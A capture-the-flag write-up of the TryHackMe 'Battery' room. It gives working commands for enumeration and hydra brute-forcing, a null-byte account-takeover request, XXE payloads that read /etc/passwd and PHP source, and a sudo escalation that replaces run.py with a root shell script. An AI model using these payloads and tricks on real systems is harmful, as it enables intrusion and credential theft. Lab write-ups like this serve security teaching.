---
layout: post
title: TryHackMe Walkthrough - Battery
date: 2021-06-23
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
permalink: /2021/06/Battery
img: 2021/06/Battery/Battery.png
---

In this room, we need to hack a web site using a vulnerability from an old version of PHP, some [XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) and using bad configuration to escalate privileges. 

I had a hard time with this one. It took me forever to find the way in the application. And then again a lot of time to find the way to escalate privileges. But I really enjoyed it. 

* Room: Battery
* Difficulty: Medium
* URL: [https://tryhackme.com/room/battery](https://tryhackme.com/room/battery)
* Authors: 
	* [Th3lazykid](https://tryhackme.com/p/Th3lazykid)
	* [golith3r00t](https://tryhackme.com/p/golith3r00t)

```
Electricity bill portal has been hacked many times in the past , so we have fired one of the employee from the security team , As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server .
```


## Enumeration
As always, I started the room by looking for opened ports. 

```bash
$ nmap -A -oN nmap.txt target
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 11:43 EDT
Nmap scan report for target (10.10.248.160)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA)
|   2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA)
|   256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA)
|_  256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.85 seconds
```

No surprise here. Ports 22 (SSH) and 80 (HTTP) are opened.

I looked at the web site, there was nothing to see there. 

![Main Site](/assets/images/2021/06/Battery/01_MainSite.png "Main Site")

Next, I launched Gobuster to check for hidden files and folders on the site.

```bash
$ gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/06/19 11:46:06 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.htaccess            (Status: 403) [Size: 286]
http://target.thm/.hta                 (Status: 403) [Size: 281]
http://target.thm/.htpasswd            (Status: 403) [Size: 286]
http://target.thm/admin.php            (Status: 200) [Size: 663]
http://target.thm/index.html           (Status: 200) [Size: 406]
http://target.thm/report               (Status: 200) [Size: 16912]
http://target.thm/scripts              (Status: 301) [Size: 309] [--> http://target.thm/scripts/]
http://target.thm/server-status        (Status: 403) [Size: 290]                                 
===============================================================
2021/06/19 11:46:46 Finished
===============================================================
```

The [admin.php](http://target.thm/admin.php) file looks interesting. It has a login form and a link to register. I kept it open while looking at the rest.

![Admin](/assets/images/2021/06/Battery/02_Admin.png "Admin")

The `/scripts/` folder had some jQuery files and an ie folder that showed an index page with only 'TEST' written. 


## Report Executable

Next I looked at [report](http://target.thm/report). This downloaded a file to my machine. 

```bash
$ file report 
report: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44ffe4e81d688f7b7fe59bdf74b03f828a4ef3fe, for GNU/Linux 3.2.0, not stripped

$ ./report 

Welcome To ABC DEF Bank Managemet System!
UserName : aa
Password : aa
Wrong username or password
```

The executable requires a username and password to login. I ran `strings` and found many emails. But nothing that looked like a password.

I then opened the executable in Ghidra to look at the code. It gave me a list of users. The same one I had found with strings.

![List Of Active Users](/assets/images/2021/06/Battery/03_ListOfActiveUsers.png "List Of Active Users")

The main function showed me the login code. It just accepted the guest/guest credentials

![Login Code](/assets/images/2021/06/Battery/04_Login.png "Login Code")

I kept digging in the code, only to realize it didn't do anything. 

I used the emails from the code to try and brute force the admin page login.

```bash
$ cat users.txt 
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
admin@bank.a
control_admin@bank.a
it_admin@bank.a


$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -u -e snr -t64 -m '/admin.php:uname=^USER^&password=^PASS^&btn=Submit:bad' target.thm http-post-form
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-22 06:12:40
[DATA] max 64 tasks per 1 server, overall 64 tasks, 143444020 login tries (l:10/p:14344402), ~2241313 tries per task
[DATA] attacking http-post-form://target.thm:80/admin.php:uname=^USER^&password=^PASS^&btn=Submit:bad
[STATUS] 2897.00 tries/min, 2897 tries in 00:01h, 143441123 to do in 825:14h, 64 active
[STATUS] 3063.67 tries/min, 9191 tries in 00:03h, 143434829 to do in 780:19h, 64 active
[STATUS] 3110.57 tries/min, 21774 tries in 00:07h, 143422246 to do in 768:29h, 64 active
```

I kept Hydra running for hours, but it did not find any valid password.

## Admin Page

I was back in the admin page. I spent a lot of time trying to break it. I tried to use SQL injection. I created a user, but it could not access most of the pages. 

The pages that where for admins only where rendered, but sent back with an alert and a header to redirect use out of the application. So I looked at the code in Burp and saw that one of them used XML. I immediately thought it might have an XXE vulnerability. I tried to block the redirect and post the XML. But the session appeared to be closed, so it did not work.

I tried creating an admin user with the email `admin@bank.a`, but adding lots of spaces at the end. Hoping that MySQL might truncate it and then I would have an admin user. But that failed to. 

At some point, I tried creating the admin user with a null byte at the end. 

```html
POST /register.php HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://target.thm
Connection: close
Referer: http://target.thm/register.php
Cookie: PHPSESSID=bfaakggtf5869ke4ie1ktuqgt7
Upgrade-Insecure-Requests: 1

uname=admin%40bank.a%00&bank=a&password=admin&btn=Register+me%21
```

And this worked. The server was using an old version of PHP. I could then connect to the application with admin@bank.a/admin. 

I went directly the the 'command' tab to try the XXE injection.

![command](/assets/images/2021/06/Battery/05_Command.png "Command")

In this page source, we can see that it's posting XML with the data from the form.

```js
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<root>' +
        '<name>' + $('#name').val() + '</name>' +
        '<search>' + $('#search').val() + '</search>' +
        '</root>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","forms.php",true);
    xmlhttp.send(xml);
};
```

I used Burp Repeater to play with the XML and try to inject some entities. It did not take long to find out I could read files on the server.

Sending this XML:
```html
POST /forms.php HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 180
Origin: http://target.thm
Connection: close
Referer: http://target.thm/forms.php
Cookie: PHPSESSID=ufek6v93v6gj463504r3l2jqb7

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<root><name>1</name><search>&xxe;</search></root>
```

Gave me the content of `/etc/passwd` in the response.
```html
Sorry, account number root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
 is not active!
```

From there I tried to read `.ssh/id_rsa` on both users. I checked for `flag.txt` or `user.txt` also. Then I tried reading the Apache logs. They all came back empty.

Next I tried to get the PHP files. I had to get them as Base64 to extract them.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "php://filter/convert.base64-encode/resource=admin.php" >]>
<root><name>1</name><search>&xxe;</search></root>
```

Most of them where not interesting. Except for some database credentials. But MySQL was not exposed to the outside.

The `acc.php` file was interesting. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "php://filter/convert.base64-encode/resource=acc.php" >]>
<root><name>1</name><search>&xxe;</search></root>
```

I took the Base64 string returned, saved it to a file and decoded it.

```bash
$ cat acc.b64 | base64 -d > acc.php
```

It gave me a file with some HTML and this PHP code.

```php
<?php
session_start();
if(isset($_SESSION['favcolor']) and $_SESSION['favcolor']==="admin@bank.a")
{

echo "<h3 style='text-align:center;'>Weclome to Account control panel</h3>";
echo "<form method='POST'>";
echo "<input type='text' placeholder='Account number' name='acno'>";
echo "<br><br><br>";
echo "<input type='text' placeholder='Message' name='msg'>";
echo "<input type='submit' value='Send' name='btn'>";
echo "</form>";
//MY CREDS :- cyber:REDACTED
if(isset($_POST['btn']))
{
$ms=$_POST['msg'];
echo "ms:".$ms;
if($ms==="id")
{
system($ms);
}
else if($ms==="whoami")
{
system($ms);
}
else
{
echo "<script>alert('RCE Detected!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
}
}
else
{
echo "<script>alert('Only Admins can access this page!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
?>
```

The credentials for the user cyber were hidden in a comment. I used them to connect with SSH and get the first flag. 

```bash
$ ssh cyber@target
cyber@target's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Jun 22 17:31:36 IST 2021

  System load:  1.04              Processes:           96
  Usage of /:   2.4% of 68.28GB   Users logged in:     0
  Memory usage: 6%                IP address for eth0: 10.10.41.219
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Tue Nov 17 17:02:47 2020 from 192.168.29.248

cyber@ubuntu:~$ ls
flag1.txt  run.py

cyber@ubuntu:~$ cat flag1.txt 
REDACTED

Sorry I am not good in designing ascii art :(
```

## Privilege Escalation

This is another place where I lost a lot of time. The first thing I tried was looking if cyber could run sudo.

```bash
cyber@ubuntu:~$ sudo -l
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
	
$ ls -la run.py 
-rwx------ 1 root root 349 Nov 15  2020 run.py

cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!
```

They could run Python on the file `run.py`. It printed a message about the web server. I couldn't edit or read the script, so I started looking elsewhere. 

I looked at the files in the web root. Found the database credentials again. I connected to it. But I couldn't find anything in there. 

I then looked at the Apache configuration. The file `apache2.conf` was writable. I modified it, trying to get it to run as root, changing some settings. I managed to crash Apache, I'm not even sure how. I spent a lot of time trying to restart it on a non privileged port, changing where the logs went so my user could start it without getting an Access Denied. Nothing worked. 

So I looked everywhere on the server. Looking for crons, suid files, ... Again nothing. I ran LinPEAS on the server. It did not find anything I could exploit. 

Then, I went back to `run.py`. I could not modify it, but it was in cyber's home folder, so they could delete it.

```bash
cyber@ubuntu:~$ ls -ld /home/cyber/
drwx------ 3 cyber cyber 4096 Nov 17  2020 /home/cyber/

cyber@ubuntu:~$ rm run.py 
rm: remove write-protected regular file ‘run.py’? y
```

I could then recreate the file with the code I wanted. I replace it with code that spawned a new bash shell and then executed it with sudo.

```bash
cyber@ubuntu:~$ cat run.py
import pty
pty.spawn("/bin/bash")

cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py

root@ubuntu:~# whoami
root
```

I was now root. So I could read the files in the yash home folder.

```bash
root@ubuntu:~# ls -l /home/yash/
total 16
-rwx------ 1 root root 864 Nov 17  2020 emergency.py
-rw-rw-r-- 1 yash yash 167 Nov 17  2020 fernet
-rw-rw-r-- 1 yash yash  68 Nov 16  2020 flag2.txt
-rw--w---- 1 yash yash 295 Nov 15  2020 root.txt

root@ubuntu:~# cat /home/yash/flag2.txt 
REDACTED


Sorry no ASCII art again :(
```

Looking at all those files, there was probably a way to escalate to yash, and then escalate to root. But I was already root. So I went for the root flag.

```bash
root@ubuntu:/home/yash# ls -l /root/
total 4
-rw-r--r-- 1 root root 937 Nov 16  2020 root.txt

root@ubuntu:/home/yash# cat /root/root.txt 
████████████████████████████████████  
██                                ██  
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██  ████  ████  ████  ████  ████  ████
██                                ██  
████████████████████████████████████  


                                                battery designed by cyberbot :)
                                                Please give your reviews on catch_me75@protonmail.com or discord cyberbot#1859



REDACTED
```

I should probably go back to the machine and try to find the intended way to root it. But for now I have the flags :)